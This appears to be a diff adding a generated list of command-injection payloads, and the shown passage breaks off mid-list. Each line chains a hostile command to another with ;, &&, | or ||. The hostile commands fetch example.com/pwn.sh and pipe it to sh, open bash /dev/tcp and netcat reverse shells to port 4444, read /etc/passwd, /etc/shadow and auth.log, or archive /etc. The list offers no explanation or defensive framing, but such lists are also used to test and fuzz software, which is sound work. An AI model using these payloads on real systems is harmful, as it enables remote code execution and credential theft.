+curl http://example.com/pwn.sh | sh && /bin/bash -c 'id'
+curl http://example.com/pwn.sh | sh | /bin/bash -c 'id'
+curl http://example.com/pwn.sh | sh || /bin/bash -c 'id'
+curl http://example.com/pwn.sh | sh ; /usr/bin/id >/tmp/id.txt
+curl http://example.com/pwn.sh | sh && /usr/bin/id >/tmp/id.txt
+curl http://example.com/pwn.sh | sh | /usr/bin/id >/tmp/id.txt
+curl http://example.com/pwn.sh | sh || /usr/bin/id >/tmp/id.txt
+curl http://example.com/pwn.sh | sh ; /bin/echo pwned > /tmp/pwned.txt
+curl http://example.com/pwn.sh | sh && /bin/echo pwned > /tmp/pwned.txt
+curl http://example.com/pwn.sh | sh | /bin/echo pwned > /tmp/pwned.txt
+curl http://example.com/pwn.sh | sh || /bin/echo pwned > /tmp/pwned.txt
+curl http://example.com/pwn.sh | sh ; /usr/bin/printf 'pwned\n'
+curl http://example.com/pwn.sh | sh && /usr/bin/printf 'pwned\n'
+curl http://example.com/pwn.sh | sh | /usr/bin/printf 'pwned\n'
+curl http://example.com/pwn.sh | sh || /usr/bin/printf 'pwned\n'
+curl http://example.com/pwn.sh | sh ; chmod +x /tmp/pwned
+curl http://example.com/pwn.sh | sh && chmod +x /tmp/pwned
+curl http://example.com/pwn.sh | sh | chmod +x /tmp/pwned
+curl http://example.com/pwn.sh | sh || chmod +x /tmp/pwned
+curl http://example.com/pwn.sh | sh ; tar -cf /tmp/dump.tar /etc
+curl http://example.com/pwn.sh | sh && tar -cf /tmp/dump.tar /etc
+curl http://example.com/pwn.sh | sh | tar -cf /tmp/dump.tar /etc
+curl http://example.com/pwn.sh | sh || tar -cf /tmp/dump.tar /etc
+curl http://example.com/pwn.sh | sh ; openssl s_client -connect example.com:443
+curl http://example.com/pwn.sh | sh && openssl s_client -connect example.com:443
+curl http://example.com/pwn.sh | sh | openssl s_client -connect example.com:443
+curl http://example.com/pwn.sh | sh || openssl s_client -connect example.com:443
+curl http://example.com/pwn.sh | sh ; ssh localhost id
+curl http://example.com/pwn.sh | sh && ssh localhost id
+curl http://example.com/pwn.sh | sh | ssh localhost id
+curl http://example.com/pwn.sh | sh || ssh localhost id
+curl http://example.com/pwn.sh | sh ; ftp http://example.com/pwn.sh
+curl http://example.com/pwn.sh | sh && ftp http://example.com/pwn.sh
+curl http://example.com/pwn.sh | sh | ftp http://example.com/pwn.sh
+curl http://example.com/pwn.sh | sh || ftp http://example.com/pwn.sh
+wget http://example.com/pwn.sh -O- | sh ; id
+wget http://example.com/pwn.sh -O- | sh && id
+wget http://example.com/pwn.sh -O- | sh | id
+wget http://example.com/pwn.sh -O- | sh || id
+wget http://example.com/pwn.sh -O- | sh ; uname -a
+wget http://example.com/pwn.sh -O- | sh && uname -a
+wget http://example.com/pwn.sh -O- | sh | uname -a
+wget http://example.com/pwn.sh -O- | sh || uname -a
+wget http://example.com/pwn.sh -O- | sh ; whoami
+wget http://example.com/pwn.sh -O- | sh && whoami
+wget http://example.com/pwn.sh -O- | sh | whoami
+wget http://example.com/pwn.sh -O- | sh || whoami
+wget http://example.com/pwn.sh -O- | sh ; ls -la /
+wget http://example.com/pwn.sh -O- | sh && ls -la /
+wget http://example.com/pwn.sh -O- | sh | ls -la /
+wget http://example.com/pwn.sh -O- | sh || ls -la /
+wget http://example.com/pwn.sh -O- | sh ; ls -la /etc
+wget http://example.com/pwn.sh -O- | sh && ls -la /etc
+wget http://example.com/pwn.sh -O- | sh | ls -la /etc
+wget http://example.com/pwn.sh -O- | sh || ls -la /etc
+wget http://example.com/pwn.sh -O- | sh ; ls -lha /root
+wget http://example.com/pwn.sh -O- | sh && ls -lha /root
+wget http://example.com/pwn.sh -O- | sh | ls -lha /root
+wget http://example.com/pwn.sh -O- | sh || ls -lha /root
+wget http://example.com/pwn.sh -O- | sh ; cat /etc/passwd
+wget http://example.com/pwn.sh -O- | sh && cat /etc/passwd
+wget http://example.com/pwn.sh -O- | sh | cat /etc/passwd
+wget http://example.com/pwn.sh -O- | sh || cat /etc/passwd
+wget http://example.com/pwn.sh -O- | sh ; cat /etc/shadow
+wget http://example.com/pwn.sh -O- | sh && cat /etc/shadow
+wget http://example.com/pwn.sh -O- | sh | cat /etc/shadow
+wget http://example.com/pwn.sh -O- | sh || cat /etc/shadow
+wget http://example.com/pwn.sh -O- | sh ; cat /etc/hosts
+wget http://example.com/pwn.sh -O- | sh && cat /etc/hosts
+wget http://example.com/pwn.sh -O- | sh | cat /etc/hosts
+wget http://example.com/pwn.sh -O- | sh || cat /etc/hosts
+wget http://example.com/pwn.sh -O- | sh ; cat /var/log/auth.log
+wget http://example.com/pwn.sh -O- | sh && cat /var/log/auth.log
+wget http://example.com/pwn.sh -O- | sh | cat /var/log/auth.log
+wget http://example.com/pwn.sh -O- | sh || cat /var/log/auth.log
+wget http://example.com/pwn.sh -O- | sh ; env
+wget http://example.com/pwn.sh -O- | sh && env
+wget http://example.com/pwn.sh -O- | sh | env
+wget http://example.com/pwn.sh -O- | sh || env
+wget http://example.com/pwn.sh -O- | sh ; ps aux
+wget http://example.com/pwn.sh -O- | sh && ps aux
+wget http://example.com/pwn.sh -O- | sh | ps aux
+wget http://example.com/pwn.sh -O- | sh || ps aux
+wget http://example.com/pwn.sh -O- | sh ; netstat -tulnp
+wget http://example.com/pwn.sh -O- | sh && netstat -tulnp
+wget http://example.com/pwn.sh -O- | sh | netstat -tulnp
+wget http://example.com/pwn.sh -O- | sh || netstat -tulnp
+wget http://example.com/pwn.sh -O- | sh ; mtr -r 127.0.0.1 -c 1
+wget http://example.com/pwn.sh -O- | sh && mtr -r 127.0.0.1 -c 1
+wget http://example.com/pwn.sh -O- | sh | mtr -r 127.0.0.1 -c 1
+wget http://example.com/pwn.sh -O- | sh || mtr -r 127.0.0.1 -c 1
+wget http://example.com/pwn.sh -O- | sh ; curl http://example.com/pwn.sh | sh
+wget http://example.com/pwn.sh -O- | sh && curl http://example.com/pwn.sh | sh
+wget http://example.com/pwn.sh -O- | sh | curl http://example.com/pwn.sh | sh
+wget http://example.com/pwn.sh -O- | sh || curl http://example.com/pwn.sh | sh
+wget http://example.com/pwn.sh -O- | sh ; wget http://example.com/pwn.sh -O- | sh
+wget http://example.com/pwn.sh -O- | sh && wget http://example.com/pwn.sh -O- | sh
+wget http://example.com/pwn.sh -O- | sh | wget http://example.com/pwn.sh -O- | sh
+wget http://example.com/pwn.sh -O- | sh || wget http://example.com/pwn.sh -O- | sh
+wget http://example.com/pwn.sh -O- | sh ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+wget http://example.com/pwn.sh -O- | sh && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+wget http://example.com/pwn.sh -O- | sh | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+wget http://example.com/pwn.sh -O- | sh || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+wget http://example.com/pwn.sh -O- | sh ; nc 127.0.0.1 4444 -e /bin/bash
+wget http://example.com/pwn.sh -O- | sh && nc 127.0.0.1 4444 -e /bin/bash
+wget http://example.com/pwn.sh -O- | sh | nc 127.0.0.1 4444 -e /bin/bash
+wget http://example.com/pwn.sh -O- | sh || nc 127.0.0.1 4444 -e /bin/bash
+wget http://example.com/pwn.sh -O- | sh ; python -c 'import os;print(os.listdir("/"))'
+wget http://example.com/pwn.sh -O- | sh && python -c 'import os;print(os.listdir("/"))'
+wget http://example.com/pwn.sh -O- | sh | python -c 'import os;print(os.listdir("/"))'
+wget http://example.com/pwn.sh -O- | sh || python -c 'import os;print(os.listdir("/"))'
+wget http://example.com/pwn.sh -O- | sh ; perl -e 'print "pwned"'
+wget http://example.com/pwn.sh -O- | sh && perl -e 'print "pwned"'
+wget http://example.com/pwn.sh -O- | sh | perl -e 'print "pwned"'
+wget http://example.com/pwn.sh -O- | sh || perl -e 'print "pwned"'
+wget http://example.com/pwn.sh -O- | sh ; php -r 'system("id");'
+wget http://example.com/pwn.sh -O- | sh && php -r 'system("id");'
+wget http://example.com/pwn.sh -O- | sh | php -r 'system("id");'
+wget http://example.com/pwn.sh -O- | sh || php -r 'system("id");'
+wget http://example.com/pwn.sh -O- | sh ; ruby -e 'puts `id`'
+wget http://example.com/pwn.sh -O- | sh && ruby -e 'puts `id`'
+wget http://example.com/pwn.sh -O- | sh | ruby -e 'puts `id`'
+wget http://example.com/pwn.sh -O- | sh || ruby -e 'puts `id`'
+wget http://example.com/pwn.sh -O- | sh ; /bin/bash -c 'id'
+wget http://example.com/pwn.sh -O- | sh && /bin/bash -c 'id'
+wget http://example.com/pwn.sh -O- | sh | /bin/bash -c 'id'
+wget http://example.com/pwn.sh -O- | sh || /bin/bash -c 'id'
+wget http://example.com/pwn.sh -O- | sh ; /usr/bin/id >/tmp/id.txt
+wget http://example.com/pwn.sh -O- | sh && /usr/bin/id >/tmp/id.txt
+wget http://example.com/pwn.sh -O- | sh | /usr/bin/id >/tmp/id.txt
+wget http://example.com/pwn.sh -O- | sh || /usr/bin/id >/tmp/id.txt
+wget http://example.com/pwn.sh -O- | sh ; /bin/echo pwned > /tmp/pwned.txt
+wget http://example.com/pwn.sh -O- | sh && /bin/echo pwned > /tmp/pwned.txt
+wget http://example.com/pwn.sh -O- | sh | /bin/echo pwned > /tmp/pwned.txt
+wget http://example.com/pwn.sh -O- | sh || /bin/echo pwned > /tmp/pwned.txt
+wget http://example.com/pwn.sh -O- | sh ; /usr/bin/printf 'pwned\n'
+wget http://example.com/pwn.sh -O- | sh && /usr/bin/printf 'pwned\n'
+wget http://example.com/pwn.sh -O- | sh | /usr/bin/printf 'pwned\n'
+wget http://example.com/pwn.sh -O- | sh || /usr/bin/printf 'pwned\n'
+wget http://example.com/pwn.sh -O- | sh ; chmod +x /tmp/pwned
+wget http://example.com/pwn.sh -O- | sh && chmod +x /tmp/pwned
+wget http://example.com/pwn.sh -O- | sh | chmod +x /tmp/pwned
+wget http://example.com/pwn.sh -O- | sh || chmod +x /tmp/pwned
+wget http://example.com/pwn.sh -O- | sh ; tar -cf /tmp/dump.tar /etc
+wget http://example.com/pwn.sh -O- | sh && tar -cf /tmp/dump.tar /etc
+wget http://example.com/pwn.sh -O- | sh | tar -cf /tmp/dump.tar /etc
+wget http://example.com/pwn.sh -O- | sh || tar -cf /tmp/dump.tar /etc
+wget http://example.com/pwn.sh -O- | sh ; openssl s_client -connect example.com:443
+wget http://example.com/pwn.sh -O- | sh && openssl s_client -connect example.com:443
+wget http://example.com/pwn.sh -O- | sh | openssl s_client -connect example.com:443
+wget http://example.com/pwn.sh -O- | sh || openssl s_client -connect example.com:443
+wget http://example.com/pwn.sh -O- | sh ; ssh localhost id
+wget http://example.com/pwn.sh -O- | sh && ssh localhost id
+wget http://example.com/pwn.sh -O- | sh | ssh localhost id
+wget http://example.com/pwn.sh -O- | sh || ssh localhost id
+wget http://example.com/pwn.sh -O- | sh ; ftp http://example.com/pwn.sh
+wget http://example.com/pwn.sh -O- | sh && ftp http://example.com/pwn.sh
+wget http://example.com/pwn.sh -O- | sh | ftp http://example.com/pwn.sh
+wget http://example.com/pwn.sh -O- | sh || ftp http://example.com/pwn.sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; uname -a
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && uname -a
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | uname -a
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || uname -a
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; whoami
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && whoami
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | whoami
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || whoami
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ls -la /
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ls -la /
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ls -la /
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ls -la /
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ls -la /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ls -la /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ls -la /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ls -la /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ls -lha /root
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ls -lha /root
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ls -lha /root
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ls -lha /root
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; cat /etc/passwd
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && cat /etc/passwd
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | cat /etc/passwd
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || cat /etc/passwd
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; cat /etc/shadow
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && cat /etc/shadow
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | cat /etc/shadow
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || cat /etc/shadow
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; cat /etc/hosts
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && cat /etc/hosts
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | cat /etc/hosts
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || cat /etc/hosts
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; cat /var/log/auth.log
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && cat /var/log/auth.log
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | cat /var/log/auth.log
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || cat /var/log/auth.log
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; env
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && env
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | env
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || env
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ps aux
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ps aux
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ps aux
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ps aux
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; netstat -tulnp
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && netstat -tulnp
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | netstat -tulnp
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || netstat -tulnp
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; mtr -r 127.0.0.1 -c 1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && mtr -r 127.0.0.1 -c 1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | mtr -r 127.0.0.1 -c 1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || mtr -r 127.0.0.1 -c 1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; curl http://example.com/pwn.sh | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && curl http://example.com/pwn.sh | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | curl http://example.com/pwn.sh | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || curl http://example.com/pwn.sh | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; wget http://example.com/pwn.sh -O- | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && wget http://example.com/pwn.sh -O- | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | wget http://example.com/pwn.sh -O- | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || wget http://example.com/pwn.sh -O- | sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; nc 127.0.0.1 4444 -e /bin/bash
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && nc 127.0.0.1 4444 -e /bin/bash
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | nc 127.0.0.1 4444 -e /bin/bash
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || nc 127.0.0.1 4444 -e /bin/bash
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; python -c 'import os;print(os.listdir("/"))'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && python -c 'import os;print(os.listdir("/"))'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | python -c 'import os;print(os.listdir("/"))'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || python -c 'import os;print(os.listdir("/"))'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; perl -e 'print "pwned"'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && perl -e 'print "pwned"'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | perl -e 'print "pwned"'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || perl -e 'print "pwned"'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; php -r 'system("id");'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && php -r 'system("id");'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | php -r 'system("id");'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || php -r 'system("id");'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ruby -e 'puts `id`'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ruby -e 'puts `id`'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ruby -e 'puts `id`'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ruby -e 'puts `id`'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; /bin/bash -c 'id'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && /bin/bash -c 'id'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | /bin/bash -c 'id'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || /bin/bash -c 'id'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; /usr/bin/id >/tmp/id.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && /usr/bin/id >/tmp/id.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | /usr/bin/id >/tmp/id.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || /usr/bin/id >/tmp/id.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; /bin/echo pwned > /tmp/pwned.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && /bin/echo pwned > /tmp/pwned.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | /bin/echo pwned > /tmp/pwned.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || /bin/echo pwned > /tmp/pwned.txt
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; /usr/bin/printf 'pwned\n'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && /usr/bin/printf 'pwned\n'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | /usr/bin/printf 'pwned\n'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || /usr/bin/printf 'pwned\n'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; chmod +x /tmp/pwned
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && chmod +x /tmp/pwned
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | chmod +x /tmp/pwned
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || chmod +x /tmp/pwned
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; tar -cf /tmp/dump.tar /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && tar -cf /tmp/dump.tar /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | tar -cf /tmp/dump.tar /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || tar -cf /tmp/dump.tar /etc
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; openssl s_client -connect example.com:443
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && openssl s_client -connect example.com:443
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | openssl s_client -connect example.com:443
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || openssl s_client -connect example.com:443
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ssh localhost id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ssh localhost id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ssh localhost id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ssh localhost id
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ; ftp http://example.com/pwn.sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 && ftp http://example.com/pwn.sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 | ftp http://example.com/pwn.sh
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || ftp http://example.com/pwn.sh
+nc 127.0.0.1 4444 -e /bin/bash ; id
+nc 127.0.0.1 4444 -e /bin/bash && id
+nc 127.0.0.1 4444 -e /bin/bash | id
+nc 127.0.0.1 4444 -e /bin/bash || id
+nc 127.0.0.1 4444 -e /bin/bash ; uname -a
+nc 127.0.0.1 4444 -e /bin/bash && uname -a
+nc 127.0.0.1 4444 -e /bin/bash | uname -a
+nc 127.0.0.1 4444 -e /bin/bash || uname -a
+nc 127.0.0.1 4444 -e /bin/bash ; whoami
+nc 127.0.0.1 4444 -e /bin/bash && whoami
+nc 127.0.0.1 4444 -e /bin/bash | whoami
+nc 127.0.0.1 4444 -e /bin/bash || whoami
+nc 127.0.0.1 4444 -e /bin/bash ; ls -la /
+nc 127.0.0.1 4444 -e /bin/bash && ls -la /
+nc 127.0.0.1 4444 -e /bin/bash | ls -la /
+nc 127.0.0.1 4444 -e /bin/bash || ls -la /
+nc 127.0.0.1 4444 -e /bin/bash ; ls -la /etc
+nc 127.0.0.1 4444 -e /bin/bash && ls -la /etc
+nc 127.0.0.1 4444 -e /bin/bash | ls -la /etc
+nc 127.0.0.1 4444 -e /bin/bash || ls -la /etc
+nc 127.0.0.1 4444 -e /bin/bash ; ls -lha /root
+nc 127.0.0.1 4444 -e /bin/bash && ls -lha /root
+nc 127.0.0.1 4444 -e /bin/bash | ls -lha /root
+nc 127.0.0.1 4444 -e /bin/bash || ls -lha /root
+nc 127.0.0.1 4444 -e /bin/bash ; cat /etc/passwd
+nc 127.0.0.1 4444 -e /bin/bash && cat /etc/passwd
+nc 127.0.0.1 4444 -e /bin/bash | cat /etc/passwd
+nc 127.0.0.1 4444 -e /bin/bash || cat /etc/passwd
+nc 127.0.0.1 4444 -e /bin/bash ; cat /etc/shadow
+nc 127.0.0.1 4444 -e /bin/bash && cat /etc/shadow
+nc 127.0.0.1 4444 -e /bin/bash | cat /etc/shadow
+nc 127.0.0.1 4444 -e /bin/bash || cat /etc/shadow
+nc 127.0.0.1 4444 -e /bin/bash ; cat /etc/hosts
+nc 127.0.0.1 4444 -e /bin/bash && cat /etc/hosts
+nc 127.0.0.1 4444 -e /bin/bash | cat /etc/hosts
+nc 127.0.0.1 4444 -e /bin/bash || cat /etc/hosts
+nc 127.0.0.1 4444 -e /bin/bash ; cat /var/log/auth.log
+nc 127.0.0.1 4444 -e /bin/bash && cat /var/log/auth.log
+nc 127.0.0.1 4444 -e /bin/bash | cat /var/log/auth.log
+nc 127.0.0.1 4444 -e /bin/bash || cat /var/log/auth.log
+nc 127.0.0.1 4444 -e /bin/bash ; env
+nc 127.0.0.1 4444 -e /bin/bash && env
+nc 127.0.0.1 4444 -e /bin/bash | env
+nc 127.0.0.1 4444 -e /bin/bash || env
+nc 127.0.0.1 4444 -e /bin/bash ; ps aux
+nc 127.0.0.1 4444 -e /bin/bash && ps aux
+nc 127.0.0.1 4444 -e /bin/bash | ps aux
+nc 127.0.0.1 4444 -e /bin/bash || ps aux
+nc 127.0.0.1 4444 -e /bin/bash ; netstat -tulnp
+nc 127.0.0.1 4444 -e /bin/bash && netstat -tulnp
+nc 127.0.0.1 4444 -e /bin/bash | netstat -tulnp
+nc 127.0.0.1 4444 -e /bin/bash || netstat -tulnp
+nc 127.0.0.1 4444 -e /bin/bash ; mtr -r 127.0.0.1 -c 1
+nc 127.0.0.1 4444 -e /bin/bash && mtr -r 127.0.0.1 -c 1
+nc 127.0.0.1 4444 -e /bin/bash | mtr -r 127.0.0.1 -c 1
+nc 127.0.0.1 4444 -e /bin/bash || mtr -r 127.0.0.1 -c 1
+nc 127.0.0.1 4444 -e /bin/bash ; curl http://example.com/pwn.sh | sh
+nc 127.0.0.1 4444 -e /bin/bash && curl http://example.com/pwn.sh | sh
+nc 127.0.0.1 4444 -e /bin/bash | curl http://example.com/pwn.sh | sh
+nc 127.0.0.1 4444 -e /bin/bash || curl http://example.com/pwn.sh | sh
+nc 127.0.0.1 4444 -e /bin/bash ; wget http://example.com/pwn.sh -O- | sh
+nc 127.0.0.1 4444 -e /bin/bash && wget http://example.com/pwn.sh -O- | sh
+nc 127.0.0.1 4444 -e /bin/bash | wget http://example.com/pwn.sh -O- | sh
+nc 127.0.0.1 4444 -e /bin/bash || wget http://example.com/pwn.sh -O- | sh
+nc 127.0.0.1 4444 -e /bin/bash ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+nc 127.0.0.1 4444 -e /bin/bash && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+nc 127.0.0.1 4444 -e /bin/bash | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+nc 127.0.0.1 4444 -e /bin/bash || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+nc 127.0.0.1 4444 -e /bin/bash ; nc 127.0.0.1 4444 -e /bin/bash
+nc 127.0.0.1 4444 -e /bin/bash && nc 127.0.0.1 4444 -e /bin/bash
+nc 127.0.0.1 4444 -e /bin/bash | nc 127.0.0.1 4444 -e /bin/bash
+nc 127.0.0.1 4444 -e /bin/bash || nc 127.0.0.1 4444 -e /bin/bash
+nc 127.0.0.1 4444 -e /bin/bash ; python -c 'import os;print(os.listdir("/"))'
+nc 127.0.0.1 4444 -e /bin/bash && python -c 'import os;print(os.listdir("/"))'
+nc 127.0.0.1 4444 -e /bin/bash | python -c 'import os;print(os.listdir("/"))'
+nc 127.0.0.1 4444 -e /bin/bash || python -c 'import os;print(os.listdir("/"))'
+nc 127.0.0.1 4444 -e /bin/bash ; perl -e 'print "pwned"'
+nc 127.0.0.1 4444 -e /bin/bash && perl -e 'print "pwned"'
+nc 127.0.0.1 4444 -e /bin/bash | perl -e 'print "pwned"'
+nc 127.0.0.1 4444 -e /bin/bash || perl -e 'print "pwned"'
+nc 127.0.0.1 4444 -e /bin/bash ; php -r 'system("id");'
+nc 127.0.0.1 4444 -e /bin/bash && php -r 'system("id");'
+nc 127.0.0.1 4444 -e /bin/bash | php -r 'system("id");'
+nc 127.0.0.1 4444 -e /bin/bash || php -r 'system("id");'
+nc 127.0.0.1 4444 -e /bin/bash ; ruby -e 'puts `id`'
+nc 127.0.0.1 4444 -e /bin/bash && ruby -e 'puts `id`'
+nc 127.0.0.1 4444 -e /bin/bash | ruby -e 'puts `id`'
+nc 127.0.0.1 4444 -e /bin/bash || ruby -e 'puts `id`'
+nc 127.0.0.1 4444 -e /bin/bash ; /bin/bash -c 'id'
+nc 127.0.0.1 4444 -e /bin/bash && /bin/bash -c 'id'
+nc 127.0.0.1 4444 -e /bin/bash | /bin/bash -c 'id'
+nc 127.0.0.1 4444 -e /bin/bash || /bin/bash -c 'id'
+nc 127.0.0.1 4444 -e /bin/bash ; /usr/bin/id >/tmp/id.txt
+nc 127.0.0.1 4444 -e /bin/bash && /usr/bin/id >/tmp/id.txt
+nc 127.0.0.1 4444 -e /bin/bash | /usr/bin/id >/tmp/id.txt
+nc 127.0.0.1 4444 -e /bin/bash || /usr/bin/id >/tmp/id.txt
+nc 127.0.0.1 4444 -e /bin/bash ; /bin/echo pwned > /tmp/pwned.txt
+nc 127.0.0.1 4444 -e /bin/bash && /bin/echo pwned > /tmp/pwned.txt
+nc 127.0.0.1 4444 -e /bin/bash | /bin/echo pwned > /tmp/pwned.txt
+nc 127.0.0.1 4444 -e /bin/bash || /bin/echo pwned > /tmp/pwned.txt
+nc 127.0.0.1 4444 -e /bin/bash ; /usr/bin/printf 'pwned\n'
